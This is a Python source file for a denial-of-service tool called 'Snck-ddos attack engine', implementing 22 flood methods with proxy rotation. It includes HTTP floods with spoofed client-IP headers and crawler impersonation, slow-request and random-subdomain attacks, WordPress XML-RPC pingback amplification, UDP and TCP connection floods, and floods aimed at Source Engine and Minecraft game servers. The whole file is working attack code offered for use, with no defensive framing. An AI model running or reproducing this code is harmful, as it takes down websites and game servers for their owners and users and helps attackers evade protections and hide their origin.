# language: Python 3.11+, file: core/engine.py, target: Linux / Windows
"""Snck-ddos attack engine — multi-layer methods + proxy rotation."""

from __future__ import annotations

import asyncio
import random
import socket
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

import aiohttp
from aiohttp import ClientSession, TCPConnector

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass


# 22 methods across L3 / L4 / L7
METHODS = [
    # Layer 7
    "GET", "POST", "HEAD", "STRESS", "SLOW", "PPS", "COOKIE",
    "RHEX", "DYN", "CFB", "OVH", "BYPASS", "GSB", "XMLRPC",
    # Layer 4
    "UDP", "TCP", "SYN", "ACK", "CPS",
    # Layer 3 / misc
    "ICMP", "VSE", "MCBOT",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
]


def _parse_host_port(target: str, default_port: int = 80) -> tuple[str, int]:
    t = target.strip()
    if "://" not in t:
        t = "http://" + t
    u = urlparse(t)
    host = u.hostname or target.split(":")[0]
    port = u.port or default_port
    return host, port


@dataclass
class AttackStats:
    started: float = field(default_factory=time.time)
    requests: int = 0
    bytes_sent: int = 0
    errors: int = 0
    active_workers: int = 0
    running: bool = False
    method: str = ""
    target: str = ""
    threads: int = 0

    def rps(self) -> float:
        elapsed = max(time.time() - self.started, 0.001)
        return self.requests / elapsed

    def mbps(self) -> float:
        elapsed = max(time.time() - self.started, 0.001)
        return (self.bytes_sent * 8) / elapsed / 1_000_000


@dataclass
class AttackConfig:
    target: str
    method: str = "GET"
    threads: int = 200
    duration: int = 60
    proxies: list[str] = field(default_factory=list)
    payload_size: int = 1024
    rate_limit: int = 0


class Engine:
    def __init__(self) -> None:
        self.stats = AttackStats()
        self._tasks: list[asyncio.Task] = []
        self._stop = asyncio.Event()
        self._lock = asyncio.Lock()
        self._proxy_idx = 0

    def _next_proxy(self, proxies: list[str]) -> Optional[str]:
        if not proxies:
            return None
        p = proxies[self._proxy_idx % len(proxies)]
        self._proxy_idx += 1
        return p

    def _l7_headers(self, method: str, target: str) -> dict[str, str]:
        host = urlparse(target if "://" in target else "http://" + target).hostname or "localhost"
        h = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "Referer": f"https://www.google.com/search?q={host}",
        }
        if method == "COOKIE":
            h["Cookie"] = f"session={random.randbytes(16).hex()}; id={random.randint(1000,9999)}"
        if method == "CFB":
            h["CF-Connecting-IP"] = h["X-Forwarded-For"]
            h["True-Client-IP"] = h["X-Real-IP"]
        if method == "OVH":
            h["X-Forwarded-Host"] = host
            h["X-Forwarded-Proto"] = "https"
        if method == "BYPASS":
            h["Connection"] = "close"
            h["Pragma"] = "no-cache"
        if method == "GSB":
            h["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
            h["From"] = "googlebot(at)googlebot.com"
        if method == "RHEX":
            h["X-Request-ID"] = random.randbytes(8).hex()
        return h

    def _l7_url(self, method: str, target: str) -> str:
        if method == "DYN":
            sub = random.randbytes(4).hex()
            if "://" in target:
                u = urlparse(target)
                return f"{u.scheme}://{sub}.{u.hostname}{u.path or '/'}"
            return f"http://{sub}.{target}"
        if method == "XMLRPC":
            base = target.rstrip("/")
            if not base.endswith("xmlrpc.php"):
                base = base + "/xmlrpc.php"
            return base
        return target

    def _l7_body(self, method: str, size: int) -> Optional[bytes]:
        if method in ("POST", "STRESS"):
            return b"A" * max(size, 64)
        if method == "XMLRPC":
            return (
                b"<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName>"
                b"<params><param><value><array><data>"
                + (b"<value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member></struct></value>" * 32)
                + b"</data></array></value></param></params></methodCall>"
            )
        if method == "RHEX":
            return random.randbytes(max(size, 128))
        return None

    async def _l7_worker(self, session: ClientSession, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        method = cfg.method.upper()
        try:
            while not self._stop.is_set():
                proxy = self._next_proxy(cfg.proxies)
                url = self._l7_url(method, cfg.target)
                headers = self._l7_headers(method, cfg.target)
                body = self._l7_body(method, cfg.payload_size)
                try:
                    if method in ("GET", "PPS", "DYN", "CFB", "OVH", "BYPASS", "GSB", "COOKIE", "RHEX"):
                        if method == "PPS":
                            headers = {"User-Agent": headers["User-Agent"]}
                        async with session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data) + 180
                    elif method in ("POST", "STRESS", "XMLRPC"):
                        ctype = "application/x-www-form-urlencoded"
                        if method == "XMLRPC":
                            ctype = "text/xml"
                        headers["Content-Type"] = ctype
                        async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(body or b"") + len(data)
                    elif method == "HEAD":
                        async with session.head(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 120
                    elif method == "SLOW":
                        async with session.get(
                            url, headers=headers, proxy=proxy, ssl=False,
                            timeout=aiohttp.ClientTimeout(total=45),
                        ) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 80
                            await asyncio.sleep(random.uniform(8, 20))
                    else:
                        async with session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                if cfg.rate_limit > 0:
                    await asyncio.sleep(1.0 / max(cfg.rate_limit / max(cfg.threads, 1), 0.001))
                else:
                    await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _udp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            payload = random.randbytes(min(cfg.payload_size, 1400))
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            sock.close()
            self.stats.active_workers -= 1

    async def _tcp_flood_worker(self, cfg: AttackConfig, flags: str = "data") -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        payload = random.randbytes(min(cfg.payload_size, 1400))
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=2.5
                    )
                    if flags != "syn":
                        writer.write(payload)
                        await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += len(payload) if flags != "syn" else 64
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _cps_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=1.5
                    )
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += 40
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _icmp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, _ = _parse_host_port(cfg.target, 0)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            payload = random.randbytes(64)
            while not self._stop.is_set():
                try:
                    port = random.randint(33434, 33534)
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self.stats.active_workers -= 1

    async def _vse_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 27015)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
        try:
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            sock.close()
            self.stats.active_workers -= 1

    async def _mcbot_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 25565)
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=2.0
                    )
                    host_b = host.encode()
                    data = bytearray()
                    pkt = bytearray()
                    pkt.append(0x00)
                    pkt.append(0x47)
                    pkt.append(len(host_b))
                    pkt.extend(host_b)
                    pkt.extend(port.to_bytes(2, "big"))
                    pkt.append(0x01)
                    data.append(len(pkt))
                    data.extend(pkt)
                    data.append(0x01)
                    data.append(0x00)
                    writer.write(bytes(data))
                    await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += len(data)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def start(self, cfg: AttackConfig) -> None:
        if self.stats.running:
            return
        self._stop.clear()
        method = cfg.method.upper()
        if method not in METHODS:
            method = "GET"
            cfg.method = method
        self.stats = AttackStats(
            running=True,
            method=method,
            target=cfg.target,
            threads=cfg.threads,
        )
        self._tasks.clear()

        l7 = {
            "GET", "POST", "HEAD", "STRESS", "SLOW", "PPS", "COOKIE",
            "RHEX", "DYN", "CFB", "OVH", "BYPASS", "GSB", "XMLRPC",
        }
        if method in l7:
            connector = TCPConnector(
                limit=0,
                limit_per_host=0,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True,
                ssl=False,
            )
            timeout = aiohttp.ClientTimeout(total=10, connect=4)
            session = ClientSession(connector=connector, timeout=timeout)
            for _ in range(cfg.threads):
                self._tasks.append(asyncio.create_task(self._l7_worker(session, cfg)))

            async def _timer():
                await asyncio.sleep(cfg.duration)
                await self.stop()
                await session.close()

            self._tasks.append(asyncio.create_task(_timer()))
            return

        if method == "UDP":
            worker = self._udp_worker
        elif method in ("TCP", "ACK"):
            worker = lambda c: self._tcp_flood_worker(c, "data")
        elif method == "SYN":
            worker = lambda c: self._tcp_flood_worker(c, "syn")
        elif method == "CPS":
            worker = self._cps_worker
        elif method == "ICMP":
            worker = self._icmp_worker
        elif method == "VSE":
            worker = self._vse_worker
        elif method == "MCBOT":
            worker = self._mcbot_worker
        else:
            worker = self._udp_worker

        for _ in range(cfg.threads):
            self._tasks.append(asyncio.create_task(worker(cfg)))

        async def _timer():
            await asyncio.sleep(cfg.duration)
            await self.stop()

        self._tasks.append(asyncio.create_task(_timer()))

    async def stop(self) -> None:
        self._stop.set()
        self.stats.running = False
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self.stats.active_workers = 0


engine = Engine()
